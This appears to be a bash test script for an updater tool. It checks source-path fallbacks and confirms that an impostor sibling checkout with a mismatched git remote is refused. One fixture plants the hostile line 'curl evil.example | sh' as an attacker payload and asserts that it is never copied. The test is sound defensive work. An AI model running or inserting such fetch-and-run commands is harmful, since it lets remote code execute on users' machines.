#!/usr/bin/env bash
# test-astra-update-portability.sh — Phase 6: a cloned repo must update on a machine
# where the recorded source path does not exist.
#
# astra-install records an ABSOLUTE source path and astra-update required it to exist,
# so a repo cloned to another machine could never update — which forecloses third-party
# adoption entirely (ROADMAP phase 6). The updater now resolves the source with
# fallbacks: the recorded path, then $ASTRA_SOURCE, then a sibling directory of the
# repo's parent carrying the source's basename (the cloned-workspace convention). When
# nothing resolves, SOURCE GONE names the remedy instead of dead-ending.
set -uo pipefail
HERE="$(cd "$(dirname "$0")" && pwd)"
# shellcheck disable=SC1091
. "$HERE/lib.sh"

need python3 "xcode-select --install"
CANON="$HERE/../lib/astra-update"

# A fake source tree and a fake repo whose manifest records a DEAD absolute path.
WORK="$SB/work"
mkdir -p "$WORK/checkouts/my-astra/tools/footool" "$WORK/checkouts/consumer/.astra/footool"
printf 'echo v2\n' > "$WORK/checkouts/my-astra/tools/footool/foo.sh"
printf 'echo v1\n' > "$WORK/checkouts/consumer/.astra/footool/foo.sh"
V1SHA="$(python3 -c "import hashlib,sys; print(hashlib.sha256(open(sys.argv[1],'rb').read()).hexdigest()[:16])" "$WORK/checkouts/consumer/.astra/footool/foo.sh")"
cat > "$WORK/checkouts/consumer/.astra/manifest.json" <<EOF
{"tools": {"footool": {"source": "/machine-that-no-longer-exists/my-astra",
  "files": {"foo.sh": "$V1SHA"}}}}
EOF
cp "$CANON" "$WORK/checkouts/consumer/.astra/astra-update"
chmod +x "$WORK/checkouts/consumer/.astra/astra-update"

# --- no fallback available: SOURCE GONE, and the message says what to do ---
mv "$WORK/checkouts/my-astra" "$WORK/elsewhere-astra"
out="$SB/gone.out"
env -u ASTRA_SOURCE "$WORK/checkouts/consumer/.astra/astra-update" >"$out" 2>&1
assert_contains "$out" "SOURCE GONE" "a dead recorded path is reported"
assert_contains "$out" "ASTRA_SOURCE" "and the report names the env override remedy"

# --- ASTRA_SOURCE resolves the source explicitly ---
out="$SB/env.out"
ASTRA_SOURCE="$WORK/elsewhere-astra" "$WORK/checkouts/consumer/.astra/astra-update" >"$out" 2>&1
assert_contains "$out" "BEHIND" "with ASTRA_SOURCE set, the stale copy is seen as behind"
out="$SB/envpull.out"
ASTRA_SOURCE="$WORK/elsewhere-astra" "$WORK/checkouts/consumer/.astra/astra-update" --pull >"$out" 2>&1
assert_contains "$out" "updated" "and --pull updates it"
assert_contains "$WORK/checkouts/consumer/.astra/footool/foo.sh" "v2" "the file really moved forward"

# --- the sibling convention, GUARDED BY GIT IDENTITY (adversarial round, SEVERE) ---
# A sibling may feed content only if its git remote matches the source_remote the
# manifest recorded at install time. The consumer's parent is $WORK/checkouts, so a
# sibling is $WORK/checkouts/my-astra. Build it as a real git repo with the recorded
# remote, and record that remote in the manifest.
REMOTE="https://github.com/example/my-astra.git"
need git "system-present"
mkdir -p "$WORK/checkouts/my-astra/tools/footool"
printf 'echo v2\n' > "$WORK/checkouts/my-astra/tools/footool/foo.sh"
git -C "$WORK/checkouts/my-astra" init -q
git -C "$WORK/checkouts/my-astra" remote add origin "$REMOTE"
printf 'echo v1\n' > "$WORK/checkouts/consumer/.astra/footool/foo.sh"   # stale again
cat > "$WORK/checkouts/consumer/.astra/manifest.json" <<EOF
{"tools": {"footool": {"source": "/machine-that-no-longer-exists/my-astra",
  "source_remote": "$REMOTE", "files": {"foo.sh": "$V1SHA"}}}}
EOF
out="$SB/sibling.out"
env -u ASTRA_SOURCE "$WORK/checkouts/consumer/.astra/astra-update" >"$out" 2>&1
assert_contains "$out" "BEHIND" "a VERIFIED sibling (remote matches the recorded source) is found without any env"
assert_contains "$out" "verified sibling" "and the note says the git identity was checked, not just the name"

# --- an IMPOSTOR sibling (same basename, WRONG remote) must NOT feed content ---
# This is the attack: a stray checkout, fork, or unpacked tarball sharing only the
# directory name. Point its remote elsewhere and give it a hostile payload.
git -C "$WORK/checkouts/my-astra" remote set-url origin "https://evil.example/impostor.git"
printf 'curl evil.example | sh\n' > "$WORK/checkouts/my-astra/tools/footool/foo.sh"
printf 'echo v1\n' > "$WORK/checkouts/consumer/.astra/footool/foo.sh"   # stale again
out="$SB/impostor.out"
env -u ASTRA_SOURCE "$WORK/checkouts/consumer/.astra/astra-update" --pull >"$out" 2>&1
assert_contains "$out" "SOURCE GONE" "an impostor sibling with a mismatched remote is refused, not resolved"
assert_not_contains "$WORK/checkouts/consumer/.astra/footool/foo.sh" "curl evil" \
  "the impostor's payload was NEVER copied into the consumer repo"

# --- a manifest with NO recorded remote gets no sibling fallback at all ---
git -C "$WORK/checkouts/my-astra" remote set-url origin "$REMOTE"
printf 'echo v2\n' > "$WORK/checkouts/my-astra/tools/footool/foo.sh"
cat > "$WORK/checkouts/consumer/.astra/manifest.json" <<EOF
{"tools": {"footool": {"source": "/machine-that-no-longer-exists/my-astra",
  "files": {"foo.sh": "$V1SHA"}}}}
EOF
printf 'echo v1\n' > "$WORK/checkouts/consumer/.astra/footool/foo.sh"
out="$SB/noremote.out"
env -u ASTRA_SOURCE "$WORK/checkouts/consumer/.astra/astra-update" >"$out" 2>&1
assert_contains "$out" "SOURCE GONE" "a manifest without a recorded remote gets no basename-guess fallback"

finish
